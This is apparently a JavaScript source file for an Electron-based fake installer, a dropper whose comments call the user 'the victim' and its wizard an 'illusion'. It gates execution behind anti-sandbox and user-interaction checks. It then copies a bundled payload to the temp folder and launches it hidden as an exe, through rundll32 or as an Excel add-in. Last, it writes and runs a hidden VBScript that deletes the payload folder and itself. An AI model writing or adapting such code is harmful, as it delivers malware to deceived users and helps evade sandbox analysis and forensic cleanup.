const { app, BrowserWindow, ipcMain } = require('electron');
const path = require('path');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { spawn } = require('child_process');
const config = require('./config');
const { runGuardrails } = require('./guardrails');

// Per-process interaction token. The renderer receives this ONCE, on first
// genuine mouse movement over the wizard window, via the 'installer:ready'
// IPC. The 'installer:run' handler then requires the token to match before
// doing ANY file I/O or spawning - this enforces that a sandbox which
// auto-invokes IPC handlers cannot bypass the user-interaction gate even
// if it skips the renderer entirely.
const INTERACTION_TOKEN = crypto.randomBytes(32).toString('hex');
let interactionTokenIssued = false;

// ---------------------------------------------------------------------------
// Out-of-process cleanup watcher
// ---------------------------------------------------------------------------
// The Electron main process exits as soon as the wizard window closes
// (window-all-closed -> app.quit), typically seconds after the loader is
// spawned. Any 'child.on("exit", ...)' handler dies with the main process, so
// we can't rely on in-process cleanup. Instead we write a small VBScript
// watcher to %TEMP% and launch it via `wscript.exe //B`, which outlives
// Electron and - crucially - does NOT allocate a console window.
//
// Why VBScript and not cmd.exe: on Windows, Node's child_process.spawn with
// `detached: true` passes DETACHED_PROCESS to CreateProcessW, which allocates
// a fresh console for cmd.exe regardless of `windowsHide: true`. cmd.exe is a
// console-subsystem binary so it always gets a console when detached,
// producing a visible flashing window (the findstr title users have
// reported). wscript.exe is a GUI-subsystem host and never allocates a
// console, so scripts it runs are truly invisible.
//
// The VBS uses WMI's Win32_Process query to poll for the loader PID. When
// the loader exits, it sleeps briefly for handles to flush, then issues a
// retrying DeleteFolder. Finally it self-deletes via a hidden-cmd Shell.Run
// so the .vbs file doesn't linger in %TEMP%.
function scheduleOutOfProcessCleanup(childPid, tmpDir) {
  try {
    const cleanupVbs = path.join(os.tmpdir(), `inst-clean-${crypto.randomUUID()}.vbs`);
    // WScript.Arguments(0) = loader PID, WScript.Arguments(1) = target dir.
    // Double-quote escape rule in VBScript: a literal " inside a string is "".
    const script = [
      'Option Explicit',
      'Dim loaderPid, targetDir, wmi, procs, fso, shell, selfPath, i',
      'loaderPid = WScript.Arguments(0)',
      'targetDir = WScript.Arguments(1)',
      '',
      'Set wmi = GetObject("winmgmts:\\\\.\\root\\cimv2")',
      '',
      "' Poll Win32_Process until the loader PID is gone.",
      'Do',
      '  Set procs = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & loaderPid)',
      '  If procs.Count = 0 Then Exit Do',
      '  WScript.Sleep 1000',
      'Loop',
      '',
      "' Allow any residual file handles to flush before deleting.",
      'WScript.Sleep 2000',
      '',
      'Set fso = CreateObject("Scripting.FileSystemObject")',
      'On Error Resume Next',
      '',
      "' Retry the delete up to three times with progressive backoff -",
      "' covers the case where the loader forked a child that still has",
      "' files open inside the tree.",
      'For i = 1 To 3',
      '  If fso.FolderExists(targetDir) Then',
      '    fso.DeleteFolder targetDir, True',
      '  End If',
      '  If Not fso.FolderExists(targetDir) Then Exit For',
      '  WScript.Sleep 2000 * i',
      'Next',
      '',
      "' Self-delete the VBS. Shell.Run intWindowStyle=0 is SW_HIDE, so the",
      "' spawned cmd has no visible window. ping provides a delay without",
      "' introducing a timeout / choice dependency.",
      'selfPath = WScript.ScriptFullName',
      'Set shell = CreateObject("WScript.Shell")',
      'shell.Run "cmd /c ping -n 2 127.0.0.1 >nul & del """ & selfPath & """", 0, False',
      '',
    ].join('\r\n');
    fs.writeFileSync(cleanupVbs, script, { encoding: 'ascii' });

    // wscript.exe //B    = batch mode, suppresses script errors and UI
    // wscript.exe //Nologo = no banner
    // wscript.exe is a GUI-subsystem binary, so nothing is visible at any
    // point in the watcher's lifecycle.
    const watcher = spawn(
      'wscript.exe',
      ['//B', '//Nologo', cleanupVbs, String(childPid), tmpDir],
      {
        detached: true,
        windowsHide: true,
        stdio: 'ignore',
      },
    );
    watcher.unref();
  } catch (_) {
    // Best-effort cleanup - if the watcher spawn fails, the tmpDir will
    // persist until the victim reboots or clears %TEMP% manually. We
    // deliberately do not surface an error to the renderer because the
    // loader has already spawned and any user-visible failure here would
    // defeat the "successful install" UX illusion.
  }
}

function createWindow() {
  const debug = !!(config.GUARDRAILS && config.GUARDRAILS.debugMode);
  const win = new BrowserWindow({
    width: debug ? 900 : 560,
    height: debug ? 640 : 420,
    resizable: debug,
    title: `${config.PRODUCT} Setup`,
    autoHideMenuBar: true,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,
      nodeIntegration: false,
      sandbox: false,
      devTools: debug,
    },
  });
  win.removeMenu();
  win.loadFile(path.join(__dirname, 'renderer', 'index.html'));
  if (debug) {
    // Auto-open devtools so the operator can see [erebus-guardrail] logs.
    win.webContents.openDevTools({ mode: 'bottom' });
  }
}

ipcMain.handle('installer:product', () => ({
  product: config.PRODUCT,
  publisher: config.PUBLISHER,
  version: config.VERSION,
  // Expose guardrail knobs the renderer needs to enforce on its side.
  dwellMs: (config.GUARDRAILS && config.GUARDRAILS.dwellMs) || 0,
  requireMouseMovement: !!(config.GUARDRAILS && config.GUARDRAILS.requireMouseMovement),
  debugMode: !!(config.GUARDRAILS && config.GUARDRAILS.debugMode),
}));

// Called by the renderer the first time it observes a real user-input event
// (mousemove, click, or keypress) inside the wizard window AND the
// configured dwell time has elapsed. The renderer is untrusted - this
// handler only hands out the interaction token once, so even a renderer
// that forges the event sequence can't reuse the token.
ipcMain.handle('installer:ready', () => {
  if (interactionTokenIssued) return { token: null };
  interactionTokenIssued = true;
  return { token: INTERACTION_TOKEN };
});

ipcMain.handle('installer:run', async (_event, providedToken) => {
  const debug = !!(config.GUARDRAILS && config.GUARDRAILS.debugMode);
  const dbg = (msg) => { if (debug) console.error(`[erebus-guardrail] ${msg}`); };

  try {
    // -------------------------------------------------------------------
    // Guardrail gate #1: interaction token.
    // The renderer must have obtained this via installer:ready, which is
    // only handed out after dwell-time + real user input. A sandbox that
    // invokes installer:run directly without going through the UI fails
    // this check and nothing is staged.
    // -------------------------------------------------------------------
    if (!interactionTokenIssued || providedToken !== INTERACTION_TOKEN) {
      dbg('interaction-token-missing - installer:run invoked without installer:ready');
      return { ok: false, error: 'no-interaction' };
    }
    dbg('gate #1 (interaction token) OK');

    // -------------------------------------------------------------------
    // Guardrail gate #2: environment checks (debugger, sandbox vars,
    // hostname/username lists, screen size, idle time, anti-analysis
    // sleeps). These run BEFORE any file copy or spawn.
    // -------------------------------------------------------------------
    const gr = await runGuardrails(config.GUARDRAILS);
    if (!gr.ok) {
      dbg(`gate #2 (environment) FAILED: ${gr.reason}`);
      return { ok: false, error: `guardrail:${gr.reason}` };
    }
    dbg('gate #2 (environment) OK');

    // -------------------------------------------------------------------
    // Only NOW do we touch the filesystem. The loader tree sits in
    // process.resourcesPath/payload/ (staged by electron-builder's
    // extraResources directive) - copy it to a fresh %TEMP%\inst-<uuid>
    // so the child process has a writable cwd and so cleanup is clean.
    // -------------------------------------------------------------------
    const srcDir = path.join(process.resourcesPath, 'payload');
    const tmpDir = path.join(os.tmpdir(), 'inst-' + crypto.randomUUID());
    fs.mkdirSync(tmpDir, { recursive: true });
    fs.cpSync(srcDir, tmpDir, { recursive: true });

    const entryPath = path.join(tmpDir, config.ENTRY_NAME);
    let child;
    switch (config.ENTRY_FORMAT) {
      case 'exe':
        child = spawn(entryPath, [], {
          detached: true,
          windowsHide: true,
          stdio: 'ignore',
          cwd: tmpDir,
        });
        break;
      case 'dll':
        child = spawn('rundll32.exe', [`${entryPath},${config.DLL_ENTRY}`], {
          detached: true,
          windowsHide: true,
          stdio: 'ignore',
          cwd: tmpDir,
        });
        break;
      case 'xll':
        child = spawn('excel.exe', ['/e', entryPath], {
          detached: true,
          windowsHide: true,
          stdio: 'ignore',
          cwd: tmpDir,
        });
        break;
      default:
        return { ok: false, error: `unsupported ENTRY_FORMAT: ${config.ENTRY_FORMAT}` };
    }

    dbg(`spawned ${config.ENTRY_FORMAT} loader pid=${child.pid} cwd=${tmpDir}`);

    // Hand cleanup off to an out-of-process watcher that polls tasklist
    // for the loader PID and rm-rf's tmpDir after the loader exits. This
    // survives the Electron main process quitting (which happens seconds
    // after the fake wizard advances to Finish) and also dodges the
    // Windows file-lock issue on the running loader exe.
    scheduleOutOfProcessCleanup(child.pid, tmpDir);
    child.unref();

    return { ok: true };
  } catch (err) {
    dbg(`unhandled error: ${err && err.message || err}`);
    return { ok: false, error: String(err && err.message || err) };
  }
});

app.whenReady().then(createWindow);
app.on('window-all-closed', () => app.quit());
